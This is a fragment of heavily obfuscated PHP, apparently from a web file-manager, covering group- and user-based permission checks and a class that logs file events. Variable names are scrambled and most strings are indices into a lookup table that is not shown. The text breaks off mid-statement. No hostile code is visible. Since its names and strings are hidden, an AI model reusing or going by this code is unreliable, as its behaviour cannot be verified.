$ª¡˜ş˜» = $‰Úò‚‘µ[$Ûú¬¬Ÿã[537]]; $ê¿ûîıİ = $‰Úò‚‘µ[$Ûú¬¬Ÿã[177]] == SourceModel::TYPE_GROUP; $·‚¤‹¤ = $ê¿ûîıİ ? $this->groupRootAuth($ª¡˜ş˜», $ş£üÁØŠ) : !1; if ($·‚¤‹¤ && Model($Ûú¬¬Ÿã[539])->authCheckAction($·‚¤‹¤[$Ûú¬¬Ÿã[454]], $Ûú¬¬Ÿã[1887])) { return $this->groupAuthInfo($·‚¤‹¤, $ª¡˜ş˜»); } $ŒÚ€”˜Ï = Model($Ûú¬¬Ÿã[1363])->parentLevelArray($‰Úò‚‘µ[$Ûú¬¬Ÿã[552]]); $ŒÚ€”˜Ï = array_merge(array($‰Úò‚‘µ[$Ûú¬¬Ÿã[180]]), array_reverse($ŒÚ€”˜Ï)); $·€“÷¸ã = !1; foreach ($ŒÚ€”˜Ï as $·Œæş’¢) { if (!isset($ş¬§íù”[$·Œæş’¢])) { continue; } $•…Ì‹†Œ = $this->authMake($ş¬§íù”[$·Œæş’¢], $ş£üÁØŠ); if ($•…Ì‹†Œ[$Ûú¬¬Ÿã[507]]) { $·€“÷¸ã = $•…Ì‹†Œ; break; } } if (!$ê¿ûîıİ) { return $·€“÷¸ã; } if (!$·€“÷¸ã && $·‚¤‹¤) { $·€“÷¸ã = $this->groupAuthInfo($·‚¤‹¤, $ª¡˜ş˜»); } if (!$·€“÷¸ã) { $Ç·€€ÇØ = Model($Ûú¬¬Ÿã[553])->getInfo($ª¡˜ş˜»); $§©ÒúğÒ = explode($Ûú¬¬Ÿã[50], trim($Ç·€€ÇØ[$Ûú¬¬Ÿã[552]], $Ûú¬¬Ÿã[50])); $§©ÒúğÒ = array_reverse($§©ÒúğÒ); foreach ($§©ÒúğÒ as $È„‰¯¶¦) { if ($È„‰¯¶¦ == $Ûú¬¬Ÿã[211] || $È„‰¯¶¦ == $°ï¬­–©) { continue; } $İ’ó÷ÙÛ = $this->groupRootAuth($È„‰¯¶¦, $ş£üÁØŠ); if (!$İ’ó÷ÙÛ) { continue; } $·€“÷¸ã = $this->groupAuthInfo($İ’ó÷ÙÛ, $È„‰¯¶¦); break; } } if (!$·€“÷¸ã || $·€“÷¸ã[$Ûú¬¬Ÿã[455]] <= 0) { $Ğëú´“ = $this->authDeepCheck($‰Úò‚‘µ[$Ûú¬¬Ÿã[180]], $ş£üÁØŠ); if ($Ğëú´“) { $·€“÷¸ã = $Ğëú´“; } } return $·€“÷¸ã; } private function userIsRoot($Úõ¨æÙ› = false) { $ï¤œÖ¬— =& $_SERVER[”ôÑ§ì¸]; if (!$Úõ¨æÙ› && _get($GLOBALS, $ï¤œÖ¬—[535])) { return !0; } $šÇŸÕæŸ = Model($ï¤œÖ¬—[566])->getInfo($Úõ¨æÙ›); $¾ğÌÈòÃ = Model($ï¤œÖ¬—[2067])->listData($šÇŸÕæŸ[$ï¤œÖ¬—[1549]]); if ($¾ğÌÈòÃ && $¾ğÌÈòÃ[$ï¤œÖ¬—[543]][$ï¤œÖ¬—[2068]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¬Üë‘î) { $¬ÔùíË… =& $_SERVER[”ôÑ§ì¸]; $¿ıí¶ªŠ = Model($¬ÔùíË…[1363]); $¨çŠÑ¼ = $¿ıí¶ªŠ->sourceInfo($¬Üë‘î); if (!$¨çŠÑ¼) { return !1; } $¿ıí¶ªŠ->groupPathDisplay($¨çŠÑ¼); $¯œŒ = array($¨çŠÑ¼); $¯œŒ = $¿ıí¶ªŠ->_listAppendPath($¯œŒ); $¨çŠÑ¼ = $¯œŒ[0]; $³ı·”¹ = $¨çŠÑ¼[$¬ÔùíË…[550]]; if (isset($¨çŠÑ¼[$¬ÔùíË…[558]])) { $ßøÔÌ¢ = explode($¬ÔùíË…[8], trim($¨çŠÑ¼[$¬ÔùíË…[550]], $¬ÔùíË…[8])); array_shift($ßøÔÌ¢); $³ı·”¹ = $¨çŠÑ¼[$¬ÔùíË…[556]] . $¬ÔùíË…[2069] . implode($¬ÔùíË…[8], $ßøÔÌ¢); } return array($¬ÔùíË…[461] => $¨çŠÑ¼[$¬ÔùíË…[32]], $¬ÔùíË…[84] => KodIO::make($¨çŠÑ¼[$¬ÔùíË…[180]]), $¬ÔùíË…[2070] => $³ı·”¹); } private function groupAuthInfo($§ ¹Ú›×, $ÛÇÀç»“) { $ëùâù± =& $_SERVER[”ôÑ§ì¸]; $Ì²ÇŸ…Û = Model($ëùâù±[553])->getInfo($ÛÇÀç»“); return array($ëùâù±[2071] => intval($§ ¹Ú›×[$ëùâù±[454]]), $ëùâù±[2055] => $§ ¹Ú›×, $ëùâù±[2072] => LNG($ëùâù±[2073]), $ëùâù±[2064] => array($ëùâù±[461] => $Ì²ÇŸ…Û[$ëùâù±[32]], $ëùâù±[84] => KodIO::make($Ì²ÇŸ…Û[$ëùâù±[87]][$ëùâù±[180]]), $ëùâù±[2070] => $Ì²ÇŸ…Û[$ëùâù±[557]])); } protected function groupRootAuth($¶¨ú•è, $Ø¶¨ƒæÔ = false) { $ôñß½¥× =& $_SERVER[”ôÑ§ì¸]; $Ø¶¨ƒæÔ = $Ø¶¨ƒæÔ ? $Ø¶¨ƒæÔ : USER_ID; $ûÖæå‘¶ = $Ø¶¨ƒæÔ . $ôñß½¥×[2074] . $¶¨ú•è; static $“Çæ¯ø™ = array(); if (isset($“Çæ¯ø™[$ûÖæå‘¶])) { return $“Çæ¯ø™[$ûÖæå‘¶]; } $æç—½Ç = Model($ôñß½¥×[553])->getInfo($¶¨ú•è); $÷¦Í“¶‹ = $this->userGroupList($Ø¶¨ƒæÔ); $ŠßÃ³¢› = isset($÷¦Í“¶‹[$¶¨ú•è]) ? $÷¦Í“¶‹[$¶¨ú•è][$ôñß½¥×[454]] : !1; if ($ŠßÃ³¢› && Model($ôñß½¥×[539])->authCheckAction($ŠßÃ³¢›[$ôñß½¥×[454]], $ôñß½¥×[1887])) { $“Çæ¯ø™[$ûÖæå‘¶] = $ŠßÃ³¢›; return $ŠßÃ³¢›; } $êŸÅÃ¾ô = $this->sourceAuthSelect($æç—½Ç[$ôñß½¥×[87]][$ôñß½¥×[180]]); $ Ó³¢Ãò = $êŸÅÃ¾ô ? $this->authMake($êŸÅÃ¾ô, $Ø¶¨ƒæÔ) : !1; $šœ£ßÁÆ = $ Ó³¢Ãò ? $ Ó³¢Ãò[$ôñß½¥×[507]] : !1; $“Çæ¯ø™[$ûÖæå‘¶] = $šœ£ßÁÆ ? $šœ£ßÁÆ : $ŠßÃ³¢›; return $“Çæ¯ø™[$ûÖæå‘¶]; } public function authOwnerApply($åÅåÄìØ) { $‘©ªÊãç =& $_SERVER[”ôÑ§ì¸]; if (empty($åÅåÄìØ[$‘©ªÊãç[454]]) || isset($åÅåÄìØ[$‘©ªÊãç[2075]]) && $åÅåÄìØ[$‘©ªÊãç[2075]]) { return $åÅåÄìØ; } if (AuthModel::authCheckRoot($åÅåÄìØ[$‘©ªÊãç[454]][$‘©ªÊãç[455]])) { return $åÅåÄìØ; } $Û§‘à§† = Model($‘©ªÊãç[1363])->parentLevelArray($åÅåÄìØ[$‘©ªÊãç[552]]); $Û§‘à§† = array_merge(array($åÅåÄìØ[$‘©ªÊãç[180]]), array_reverse($Û§‘à§†)); $±ìı€¶· = $this->sourceAuthSelect($Û§‘à§†); $Ó¢©ğĞõ = array(); $®¨éĞ÷ï = array(); foreach ($±ìı€¶· as $Ñ¢ğÌ‹ú => $øåØŸÚ±) { $–Æ¡š = $this->authFolderOwnerUser($øåØŸÚ±); $Ó¢©ğĞõ[$Ñ¢ğÌ‹ú] = $–Æ¡š; $®¨éĞ÷ï = array_merge($®¨éĞ÷ï, $–Æ¡š[$‘©ªÊãç[629]]); if ($–Æ¡š[$‘©ªÊãç[2076]]) { break; } } if (count($®¨éĞ÷ï) == 0) { $®¨éĞ÷ï = $this->authFolderOwnerGroup($åÅåÄìØ[$‘©ªÊãç[537]]); } $®¨éĞ÷ï = array_unique($®¨éĞ÷ï); if (AuthModel::authCheckRoot($åÅåÄìØ[$‘©ªÊãç[454]][$‘©ªÊãç[455]])) { $®¨éĞ÷ï[] = USER_ID; } $åÅåÄìØ[$‘©ªÊãç[454]][$‘©ªÊãç[2077]] = Model($‘©ªÊãç[545])->userListInfo($®¨éĞ÷ï); return $åÅåÄìØ; } private function authFolderOwnerGroup($¾àíöÛë) { $©ƒÏÆÖ‚ =& $_SERVER[”ôÑ§ì¸]; $ ¾óÛ‘Ô = Model($©ƒÏÆÖ‚[1956])->where(array($©ƒÏÆÖ‚[1866] => $¾àíöÛë))->select(); $„í ¯Ş© = array(); if (!$ ¾óÛ‘Ô) { return $„í ¯Ş©; } foreach ($ ¾óÛ‘Ô as $ƒ˜ àÑÍ) { $òÂ‹Õ¨Ç = $this->authInfo($ƒ˜ àÑÍ); if (AuthModel::authCheckRoot($òÂ‹Õ¨Ç[$©ƒÏÆÖ‚[454]])) { $„í ¯Ş©[] = $ƒ˜ àÑÍ[$©ƒÏÆÖ‚[1674]]; } } return $„í ¯Ş©; } private function authFolderOwnerUser($±ÙÒËÇ) { $†Ê§ÙîË =& $_SERVER[”ôÑ§ì¸]; $ÜÖ€‡ = array(); $ï×ï€ª˜ = !1; foreach ($±ÙÒËÇ as $Ûº“Ä¿ú) { $öƒÃß„À = $this->authInfo($Ûº“Ä¿ú); if ($Ûº“Ä¿ú[$†Ê§ÙîË[537]] == $†Ê§ÙîË[211]) { $ï×ï€ª˜ = !0; } if ($Ûº“Ä¿ú[$†Ê§ÙîË[177]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($öƒÃß„À[$†Ê§ÙîË[454]])) { $ÜÖ€‡[] = $Ûº“Ä¿ú[$†Ê§ÙîË[537]]; } } } return array($†Ê§ÙîË[629] => $ÜÖ€‡, $†Ê§ÙîË[2076] => $ï×ï€ª˜); } public function authMake($Ñ‚î¥µ, $ùÓÜş¤ = false) { $Ÿµä¥¶á =& $_SERVER[”ôÑ§ì¸]; $¦¤·ÑÊ = $this->authArrayCheck($Ñ‚î¥µ, $ùÓÜş¤); if ($¦¤·ÑÊ[$Ÿµä¥¶á[2078]]) { $¦¤·ÑÊ[$Ÿµä¥¶á[2078]] = $this->sourceAuthInfo($¦¤·ÑÊ[$Ÿµä¥¶á[2078]]); } return $¦¤·ÑÊ; } public function authArrayCheck($„¯ÉÀÉ², $¦úæšÏê = false) { $¨ˆÄì£Ï =& $_SERVER[”ôÑ§ì¸]; if (!$„¯ÉÀÉ²) { return array($¨ˆÄì£Ï[455] => 0, $¨ˆÄì£Ï[507] => !1); } $¦úæšÏê = $¦úæšÏê ? $¦úæšÏê : USER_ID; $™ğïÚôİ = 0; $ÇˆˆöĞÀ = 0; $¶¿¯Ÿ“Ê = 0; $”ïøŸÒ = 0; $±²Ô¦Ö° = 0; $ÀÌ¦Âëä = 0; $Íç×»Š¾ = 1000; $¸ñó¤ôı = 0; $İŞ¤¥¹Ñ = 0; $ÒÏø™ãÈ = 0; $õß¡öšß = 0; $Âó³İ¼¼ = array($¨ˆÄì£Ï[180] => 0); foreach ($„¯ÉÀÉ² as $Âó³İ¼¼) { $²Ğ÷†æ = $this->authInfo($Âó³İ¼¼); if (!$²Ğ÷†æ) { continue; } $ûÓ¯äâ = $Âó³İ¼¼[$¨ˆÄì£Ï[537]]; $ªî–èú÷ = intval($²Ğ÷†æ[$¨ˆÄì£Ï[454]]); if ($Âó³İ¼¼[$¨ˆÄì£Ï[177]] == SourceModel::TYPE_USER && $ûÓ¯äâ == $¦úæšÏê) { $™ğïÚôİ = !0; $¶¿¯Ÿ“Ê = $²Ğ÷†æ; $ÇˆˆöĞÀ = $ªî–èú÷; } else { if ($Âó³İ¼¼[$¨ˆÄì£Ï[177]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ûÓ¯äâ, $¦úæšÏê)) { $”ïøŸÒ = !0; $ø¹õ›´“ = $this->groupStepToUserGroup($ûÓ¯äâ, $¦úæšÏê); if ($ø¹õ›´“ < $Íç×»Š¾) { $Íç×»Š¾ = $ø¹õ›´“; $±²Ô¦Ö° = $ªî–èú÷; $ÀÌ¦Âëä = $²Ğ÷†æ; $¸ñó¤ôı = $ûÓ¯äâ; } if ($ø¹õ›´“ == $Íç×»Š¾ && $ªî–èú÷ >= $±²Ô¦Ö°) { $±²Ô¦Ö° = $ªî–èú÷; $ÀÌ¦Âëä = $²Ğ÷†æ; $¸ñó¤ôı = $ûÓ¯äâ; } } else { if ($ûÓ¯äâ == $¨ˆÄì£Ï[211]) { $İŞ¤¥¹Ñ = !0; $õß¡öšß = $²Ğ÷†æ; $ÒÏø™ãÈ = $ªî–èú÷; } } } } if ($™ğïÚôİ) { $÷–—¢á = $ÇˆˆöĞÀ; $²Ğ÷†æ = $¶¿¯Ÿ“Ê; $…ú…ƒôŸ = LNG($¨ˆÄì£Ï[2079]); } else { if ($”ïøŸÒ) { $÷–—¢á = $±²Ô¦Ö°; $²Ğ÷†æ = $ÀÌ¦Âëä; $Ù ¸ï¡ = Model($¨ˆÄì£Ï[553])->getInfo($¸ñó¤ôı); $…ú…ƒôŸ = $¨ˆÄì£Ï[162] . $Ù ¸ï¡[$¨ˆÄì£Ï[557]] . $¨ˆÄì£Ï[2080] . LNG($¨ˆÄì£Ï[2081]); } else { if ($İŞ¤¥¹Ñ) { $÷–—¢á = $ÒÏø™ãÈ; $²Ğ÷†æ = $õß¡öšß; $…ú…ƒôŸ = LNG($¨ˆÄì£Ï[2052]); } else { $÷–—¢á = 0; $²Ğ÷†æ = !1; $…ú…ƒôŸ = $¨ˆÄì£Ï[12]; } } } $†¶¿¥•„ = array($¨ˆÄì£Ï[2071] => intval($÷–—¢á), $¨ˆÄì£Ï[2055] => $²Ğ÷†æ, $¨ˆÄì£Ï[2072] => $…ú…ƒôŸ, $¨ˆÄì£Ï[2064] => $Âó³İ¼¼[$¨ˆÄì£Ï[180]]); return $†¶¿¥•„; } private function groupContainUser($œ¦ªÍœé, $¥Ö®şğä = false) { return in_array($œ¦ªÍœé, $this->userGroupParents($¥Ö®şğä)); } private function groupStepToUserGroup($ÛëÍ«ßĞ, $“ùŞ„º = false) { $İ“ú¤ÅË =& $_SERVER[”ôÑ§ì¸]; $˜Ñ„ùÒÊ = $this->userGroupList($“ùŞ„º); $Úó¤™Æ = 1000; $„‡ïüÅ = $GLOBALS[$İ“ú¤ÅË[6]][$İ“ú¤ÅË[89]][$İ“ú¤ÅË[1969]] == 1; $àİÜÆ¨î = $„‡ïüÅ ? 3 : 2; foreach ($˜Ñ„ùÒÊ as $¡ÕÏ’¢÷) { if ($¡ÕÏ’¢÷[$İ“ú¤ÅË[1866]] == $ÛëÍ«ßĞ) { return 0; } $•ŸÏ²Şá = explode($İ“ú¤ÅË[50], trim($¡ÕÏ’¢÷[$İ“ú¤ÅË[552]], $İ“ú¤ÅË[50])); if ($•ŸÏ²Şá[0] == $İ“ú¤ÅË[211] && count($•ŸÏ²Şá) > $àİÜÆ¨î) { $ü¹ó¾®½ = array_reverse(array_slice($•ŸÏ²Şá, $àİÜÆ¨î)); $‚µÏµ“ä = array_search($ÛëÍ«ßĞ, $ü¹ó¾®½); if ($‚µÏµ“ä !== !1 && $‚µÏµ“ä + 1 <= $Úó¤™Æ) { $Úó¤™Æ = $‚µÏµ“ä + 1; } } } return $Úó¤™Æ; } private function userGroupList($ıëüµ¯† = false) { $ŠÖõ€‚Ë =& $_SERVER[”ôÑ§ì¸]; static $Æá¨÷ñŸ = array(); if (isset($Æá¨÷ñŸ[$ıëüµ¯†])) { return $Æá¨÷ñŸ[$ıëüµ¯†]; } $½ÀÃã„í = Model($ŠÖõ€‚Ë[566])->getInfo($ıëüµ¯†); $Æá¨÷ñŸ[$ıëüµ¯†] = array_to_keyvalue($½ÀÃã„í[$ŠÖõ€‚Ë[2053]], $ŠÖõ€‚Ë[1866]); return $Æá¨÷ñŸ[$ıëüµ¯†]; } public function userGroupParents($ú¼ïØá) { $ó¸Ï‡¹… =& $_SERVER[”ôÑ§ì¸]; static $Ã²­¾™ = array(); $ú¼ïØá = $ú¼ïØá ? $ú¼ïØá : USER_ID; if (isset($Ã²­¾™[$ú¼ïØá])) { return $Ã²­¾™[$ú¼ïØá]; } $‹–•¥ğ­ = $this->userGroupList($ú¼ïØá); $ŞÕşõÆï = array(); $Õ¶±™ØŞ = $GLOBALS[$ó¸Ï‡¹…[6]][$ó¸Ï‡¹…[89]][$ó¸Ï‡¹…[1969]] == 1; $šÀ¯ÚêĞ = $Õ¶±™ØŞ ? 3 : 2; foreach ($‹–•¥ğ­ as $†¨ô“š) { $ŠêÄ…À› = array($†¨ô“š[$ó¸Ï‡¹…[1866]]); $äü°ºî– = explode($ó¸Ï‡¹…[50], trim($†¨ô“š[$ó¸Ï‡¹…[552]], $ó¸Ï‡¹…[50])); if ($äü°ºî–[0] == $ó¸Ï‡¹…[211] && count($äü°ºî–) > $šÀ¯ÚêĞ) { $àÉ°‘‹ã = array_slice($äü°ºî–, $šÀ¯ÚêĞ); $ŠêÄ…À› = array_merge($ŠêÄ…À›, array_reverse($àÉ°‘‹ã)); } $ŞÕşõÆï = array_merge($ŞÕşõÆï, $ŠêÄ…À›); } $Ã²­¾™[$ú¼ïØá] = array_unique($ŞÕşõÆï); return $Ã²­¾™[$ú¼ïØá]; } public function authTargetInfoMake($‚–Œ¡·) { $èĞá› =& $_SERVER[”ôÑ§ì¸]; $à»àà‰ = array(); $À¬–ÉßÜ = array(); foreach ($‚–Œ¡· as $®°ºá’€) { if ($®°ºá’€[$èĞá›[177]] == SourceModel::TYPE_USER) { $à»àà‰[] = intval($®°ºá’€[$èĞá›[537]]); } else { if ($®°ºá’€[$èĞá›[177]] == SourceModel::TYPE_GROUP) { $À¬–ÉßÜ[] = intval($®°ºá’€[$èĞá›[537]]); } } } if ($à»àà‰) { $à»àà‰ = Model($èĞá›[545])->userListInfo($à»àà‰); } if ($À¬–ÉßÜ) { $ÃŠˆÛü = array($èĞá›[1954] => array($èĞá›[459], $À¬–ÉßÜ)); $À¬–ÉßÜ = Model($èĞá›[553])->field($èĞá›[2082])->where($ÃŠˆÛü)->select(); $À¬–ÉßÜ = array_to_keyvalue($À¬–ÉßÜ, $èĞá›[1866]); } return array($èĞá›[2083] => $à»àà‰, $èĞá›[2084] => $À¬–ÉßÜ); } public function authInfo($ìÅÖÖ¿) { $Ê°œï„æ =& $_SERVER[”ôÑ§ì¸]; if ($ìÅÖÖ¿[$Ê°œï„æ[1970]]) { $•ííó¢­ = Model($Ê°œï„æ[539])->listData($ìÅÖÖ¿[$Ê°œï„æ[1970]]); if (!$•ííó¢­) { return !1; $ŠÛóõíÉ = Model($Ê°œï„æ[539])->listData(); $…Š²æ•Ä = array_filter_by_field($ŠÛóõíÉ, $Ê°œï„æ[454], $Ê°œï„æ[211]); return $…Š²æ•Ä; } $ñó›ì™º = array_field_key($•ííó¢­, array($Ê°œï„æ[442], $Ê°œï„æ[32], $Ê°œï„æ[454], $Ê°œï„æ[1889], $Ê°œï„æ[1890])); $ñó›ì™º[$Ê°œï„æ[2085]] = $ìÅÖÖ¿; return $ñó›ì™º; } else { return array($Ê°œï„æ[460] => 0, $Ê°œï„æ[1872] => $ìÅÖÖ¿[$Ê°œï„æ[2030]], $Ê°œï„æ[461] => $Ê°œï„æ[12], $Ê°œï„æ[1889] => $Ê°œï„æ[2086]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\162\143\x65\137\x65\166\145\x6e\164"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\x54\151\x6d\145", "\x74\151\155\x65", "\x69\156\x73\x65\x72\164", "\x66\x75\x6e\143\164\151\x6f\x6e"), array("\x64\x65\x73\143", '', "\x69\156\163\x65\x72\164\54\165\160\144\141\x74\145\54\x73\145\154\145\x63\x74", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($œšøÄØÜ, $¥äë¥ ”, $•ƒ‚Ñ‘ø = '') { $âãÁÔÎİ =& $_SERVER[”ôÑ§ì¸]; if (!$this->eventSave) { return; } $§˜˜ó = Model($âãÁÔÎİ[1363])->sourceInfo($œšøÄØÜ); if (!$§˜˜ó) { return !1; } if ($this->isCacheEvent($§˜˜ó, $¥äë¥ ”)) { return; } if ($•ƒ‚Ñ‘ø && is_string($•ƒ‚Ñ‘ø)) { $•ƒ‚Ñ‘ø = array($âãÁÔÎİ[1905] => $•ƒ‚Ñ‘ø); } $³€Öæ•÷ = defined($âãÁÔÎİ[2087]) ? USER_ID : 0; $¶şÜ…ùö = array($âãÁÔÎİ[458] => $œšøÄØÜ, $âãÁÔÎİ[2088] => $§˜˜ó[$âãÁÔÎİ[179]], $âãÁÔÎİ[2089] => $§˜˜ó[$âãÁÔÎİ[32]], $âãÁÔÎİ[550] => !empty($§˜˜ó[$âãÁÔÎİ[550]]) ? $§˜˜ó[$âãÁÔÎİ[550]] : $âãÁÔÎİ[12], $âãÁÔÎİ[1665] => $³€Öæ•÷, $âãÁÔÎİ[463] => $¥äë¥ ”, $âãÁÔÎİ[1667] => $•ƒ‚Ñ‘ø); $this->addSystemLog($¥äë¥ ”, $¶şÜ…ùö); unset($¶şÜ…ùö[$âãÁÔÎİ[2089]], $¶şÜ…ùö[$âãÁÔÎİ[550]]); return $this->add($¶şÜ…ùö); } private function addSystemLog($İÔì”, $éìô‡¶®) { $º÷–˜¢ =& $_SERVER[”ôÑ§ì¸]; if ($İÔì” == $º÷–˜¢[2090]) { $İÔì” = $éìô‡¶®[$º÷–˜¢[493]][$º÷–˜¢[2091]]; } else { if (in_array($İÔì”, array($º÷–˜¢[1846], $º÷–˜¢[2092]))) { $İÔì” = $éìô‡¶®[$º÷–˜¢[493]][$º÷–˜¢[776]]; } } $éïÁÇ”¦ = array_merge($éìô‡¶®, array($º÷–˜¢[2093] => $éìô‡¶®[$º÷–˜¢[180]], $º÷–˜¢[2094] => $éìô‡¶®[$º÷–˜¢[2094]])); Hook::trigger($º÷–˜¢[2095], $º÷–˜¢[2096] . $İÔì”, $éìô‡¶®); Model($º÷–˜¢[1810])->addLog($º÷–˜¢[2096] . $İÔì”, $éïÁÇ”¦); } private function isCacheEvent($ššÅÀĞŒ, $ÌÇŞ‚ş¸) { if ($ššÅÀĞŒ[$_SERVER[”ôÑ§ì¸][177]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($äÈó˜, $æèÑ‘ó) { $ ³ÓÎ£‚ =& $_SERVER[”ôÑ§ì¸]; $“Ÿ¤¾”Ê = Model($ ³ÓÎ£‚[1363])->sourceInfo($äÈó˜); $¸÷İ¢•Í = array($ ³ÓÎ£‚[2091] => $æèÑ‘ó, $ ³ÓÎ£‚[32] => $“Ÿ¤¾”Ê[$ ³ÓÎ£‚[32]]); return $this->addEvent($äÈó˜, $ ³ÓÎ£‚[2090], $¸÷İ¢•Í); } public function eventFileEdit($¦Ê·µ¬ˆ) { $íı÷„ï… =& $_SERVER[”ôÑ§ì¸]; $íÁµ¿¸° = array($íı÷„ï…[2097] => $_SERVER[$íı÷„ï…[2098]], $íı÷„ï…[2099] => strtolower(ACTION)); if (isset($GLOBALS[$íı÷„ï…[7]][$íı÷„ï…[2100]])) { $íÁµ¿¸°[$íı÷„ï…[2100]] = $íı÷„ï…[88]; } return $this->addEvent($¦Ê·µ¬ˆ, $íı÷„ï…[1836], $íÁµ¿¸°); } public function eventRecycle($éıºì¨Ö, $§¾¾âÃİ) { return $this->addEvent($éıºì¨Ö, $_SERVER[”ôÑ§ì¸][2092], $§¾¾âÃİ); } public function eventRemove($ğ¶£ñäœ) { $¿ªƒå‡ş =& $_SERVER[”ôÑ§ì¸]; $©“òÑú = Model($¿ªƒå‡ş[1363])->sourceInfo($ğ¶£ñäœ); $ã•ø²Ù = $©“òÑú[$¿ªƒå‡ş[32]]; return $this->addEvent($©“òÑú[$¿ªƒå‡ş[179]], $¿ªƒå‡ş[1835], $ã•ø²Ù); } public function eventShare($Äú ªö«, $ï£Õ“) { return $this->addEvent($Äú ªö«, $_SERVER[”ôÑ§ì¸][1846], $ï£Õ“); } public function eventMove($¬–Ü‰ò, $©È˜â¶, $–Á°—Èœ) { $ÁÌîÖºÏ =& $_SERVER[”ôÑ§ì¸]; $µş¹Ú²œ = Model($ÁÌîÖºÏ[1363]); $©‘ç±Ÿ = $µş¹Ú²œ->sourceInfo($¬–Ü‰ò); $¼Ê ·Ó = $µş¹Ú²œ->sourceInfo($©È˜â¶); $°¹ÉßúÜ = $µş¹Ú²œ->sourceInfo($–Á°—Èœ); $²š‡“¨€ = array($ÁÌîÖºÏ[1191] => $©È˜â¶, $ÁÌîÖºÏ[2101] => $¼Ê ·Ó[$ÁÌîÖºÏ[32]], $ÁÌîÖºÏ[2078] => !empty($¼Ê ·Ó[$ÁÌîÖºÏ[550]]) ? $¼Ê ·Ó[$ÁÌîÖºÏ[550]] : $ÁÌîÖºÏ[12], $ÁÌîÖºÏ[1192] => $–Á°—Èœ, $ÁÌîÖºÏ[2102] => $°¹ÉßúÜ[$ÁÌîÖºÏ[32]], $ÁÌîÖºÏ[2103] => !empty($°¹ÉßúÜ[$ÁÌîÖºÏ[550]]) ? $°¹ÉßúÜ[$ÁÌîÖºÏ[550]] : $ÁÌîÖºÏ[12]); $this->addEvent($¬–Ü‰ò, $ÁÌîÖºÏ[587], $²š‡“¨€); $©‘ç±Ÿ = $µş¹Ú²œ->sourceInfo($¬–Ü‰ò); $²š‡“¨€ = array($ÁÌîÖºÏ[180] => $©‘ç±Ÿ[$ÁÌîÖºÏ[180]], $ÁÌîÖºÏ[32] => $©‘ç±Ÿ[$ÁÌîÖºÏ[32]]); $this->addEvent($©È˜â¶, $ÁÌîÖºÏ[2104], $²š‡“¨€); } public function eventCopy($ÙÒÁÌå) { $this->eventCreate($ÙÒÁÌå, $_SERVER[”ôÑ§ì¸][585]); } public function eventRename($ìçà¿ş, $ØËŠôØ½, $ıíİ¸ò®) { $˜µ¾ª±· =& $_SERVER[”ôÑ§ì¸]; $ü„¤›²á = array($˜µ¾ª±·[1191] => $ØËŠôØ½, $˜µ¾ª±·[1192] => $ıíİ¸ò®); return $this->addEvent($ìçà¿ş, $˜µ¾ª±·[1377], $ü„¤›²á); } public function eventAddComment($˜¸åêùø, $š“‚ ª) { return $this->addEvent($˜¸åêùø, $_SERVER[”ôÑ§ì¸][2105], $š“‚ ª); } public function eventAddDesc($¥Ò¯øí‰, $ìÅÜ¸–ô) { return $this->addEvent($¥Ò¯øí‰, $_SERVER[”ôÑ§ì¸][2106], $ìÅÜ¸–ô); } public function listBySource($æ§°§“) { $±•Áã÷ =& $_SERVER[”ôÑ§ì¸]; $Äø ¿à = Model($±•Áã÷[1363])->sourceInfo($æ§°§“); $Üâ©¼È× = array($±•Áã÷[458] => $æ§°§“); if ($Äø ¿à[$±•Áã÷[452]] == $±•Áã÷[88]) { $ñçôùÊ = Model($±•Áã÷[1363])->listSearchChildren($æ§°§“, 20000); $ñçôùÊ[] = $æ§°§“ . $±•Áã÷[421]; $Üâ©¼È× = array($±•Áã÷[180] => array($±•Áã÷[7], $ñçôùÊ)); } $èÇ¹Ã™ê = $this->where($Üâ©¼È×)->order($±•Áã÷[2107])->selectPage(); if ($èÇ¹Ã™ê[$±•Áã÷[409]][$±•Áã÷[410]] == 0) { $èÇ¹Ã™ê[$±•Áã÷[409]][$±•Áã÷[410]] = 1; $èÇ¹Ã™ê[$±•Áã÷[412]] = array(array($±•Áã÷[458] => $æ§°§“, $±•Áã÷[2088] => $Äø ¿à[$±•Áã÷[179]], $±•Áã÷[1665] => $Äø ¿à[$±•Áã÷[494]], $±•Áã÷[463] => $±•Áã÷[2108], $±•Áã÷[464] => $Äø ¿à[$±•Áã÷[214]], $±•Áã÷[1667] => $±•Áã÷[12])); } return $this->eventListParse($èÇ¹Ã™ê, $æ§°§“); } private function eventListParse($Ùö±–­Ÿ, $†ã”ÃÁ™) { $üµ§üÉ =& $_SERVER[”ôÑ§ì¸]; $Áä¬¼«Î = $Ùö±–­Ÿ[$üµ§üÉ[412]]; $ÒŠ´Ñœ = array_to_keyvalue($Áä¬¼«Î, $üµ§üÉ[12], $üµ§üÉ[180]); $©Œ‘Ää¹ = array_to_keyvalue($Áä¬¼«Î, $üµ§üÉ[12], $üµ§üÉ[2094]); foreach ($Áä¬¼«Î as $„òŠÄ›¡) { $¨ıú¸º´ = $„òŠÄ›¡[$üµ§üÉ[493]]; if ($„òŠÄ›¡[$üµ§üÉ[33]] == $üµ§üÉ[587] && isset($¨ıú¸º´[$üµ§üÉ[1191]])) { $ÒŠ´Ñœ[] = $¨ıú¸º´[$üµ§üÉ[1191]] . $üµ§üÉ[12]; $ÒŠ´Ñœ[] = $¨ıú¸º´[$üµ§üÉ[1192]] . $üµ§üÉ[12]; } if ($„òŠÄ›¡[$üµ§üÉ[33]] == $üµ§üÉ[2104] && isset($¨ıú¸º´[$üµ§üÉ[180]])) { $ÒŠ´Ñœ[] = $¨ıú¸º´[$üµ§üÉ[180]] . $üµ§üÉ[12]; } } $ÒŠ´Ñœ = array_merge($ÒŠ´Ñœ, $©Œ‘Ää¹, array($†ã”ÃÁ™ . $üµ§üÉ[12])); $ÒŠ´Ñœ = array_unique($ÒŠ´Ñœ); $…Á¯àª = array_unique(array_to_keyvalue($Áä¬¼«Î, $üµ§üÉ[12], $üµ§üÉ[1674])); $À Ë€²Õ = Model($üµ§üÉ[566])->userListInfo($…Á¯àª); $ÉĞ€úİ¥ = 